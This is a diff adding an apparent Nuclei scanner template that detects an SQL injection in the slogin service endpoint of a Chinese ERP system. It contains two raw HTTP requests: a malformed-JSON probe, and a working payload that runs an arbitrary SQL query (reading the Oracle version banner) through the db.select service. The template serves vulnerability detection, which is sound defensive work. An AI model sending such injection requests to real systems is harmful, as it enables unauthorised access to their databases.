@@ -1,0 +1,43 @@
+id: yun-shi-kong-erp-slogin-sqli
+info:
+  name: 云时空社会化商业ERP系统 slogin SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    云时空社会化商业ERP系统 contains an SQL injection vulnerability in the slogin service endpoint that could allow attackers to extract sensitive database information.
+http:
+  - raw:
+      - |
+        POST /slogin/service?service=db.select HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        params=%7B%22
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "JSONException:"
+  - raw:
+      - |
+        POST /slogin/service?service=db.select HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        params=%7B%22sql%22%3A%22SELECT+%2A+FROM+V%24VERSION%22%7D
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "Oracle Database"
+          - "Version"
+          - "\"fields\":[\"BANNER\"]"
